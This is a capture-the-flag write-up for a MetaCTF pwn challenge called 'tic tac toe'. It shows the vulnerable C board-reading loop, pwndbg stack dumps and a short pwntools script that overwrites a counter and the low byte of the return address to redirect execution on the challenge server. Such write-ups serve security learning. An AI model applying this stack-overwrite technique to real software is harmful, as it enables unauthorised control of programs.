---
title: "[pwn] tic tac toe"
categories:
  - CTF
tags:
  - pwn
  - overwiteLastByteRet
---

[tic tac toe [metaCTF]](https://github.com/v13td0x/Q4_21/raw/main/meta/pwn/Tic%20tac%20toe/tic_tac_toe_Release.tar.gz)

```apl
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

```c
int read_board(){
	char board[3][3]; // $sbp-0xa
	char counter = 0; // $rbp-0x1

	//read the board in
	while (counter < 9){
		while(1){
			read(0, (char*)board+counter++, 1);

			if (*((char *)board+counter-1) == '\n')
			{
				counter--;
				continue;
			}
			if (*((char*)board + counter-1) == 'o' || *((char*)board + counter-1) == 'O' ||*((char*)board + counter-1) == '0' || *((char*)board + counter-1) == 'x' || *((char*)board + counter-1) == 'X'){
				break;
			}
			puts("Bad Character, try again");
		}
	}
// if last byte was an x, X, o, O, or 0 program will check counter<9,
// otherwise continue read from input and write in stack at board[counter]
```

```bash
02:0010│ rsp     0x7fff2059f840 ◂— 0x767655b24517f0a0
03:0018│         0x7fff2059f848 ◂— 0x1376767676767676
04:0020│ rbp     0x7fff2059f850 —▸ 0x7fff2059f860 ◂— 0x0
05:0028│ rax rsi 0x7fff2059f858 —▸ 0x55b24517f645 (main+60) # ret
pwndbg> x $rbp-0x1
0x7fff2059f84f: 0x007fff2059f86013 # counter = 13
pwndbg> x/x $rbp+8
0x7fff3d59caf8: 0x45 #last byte of ret addr
```

your strategy is over last byte of ret addr 0x45→ `0x4f`, we will overwrite counter var = 0x12++. Because `board[counter=0x13]` = last byte of ret addr (0xa bytes of board + 8 byte rbp + 1 last byte ret). 

> Remember: we need 9 byte `not` in {x, X, 0, o, O} to not check counter and '\n' to increase counter var. Due to overwrite `counter` var
> 

```python
# xpl.py
from pwn import *

p = remote("host.cg21.metaproblems.com", 3120)
p.send(b'v'*9 + b'\x12\x4f')
p.stream()
```
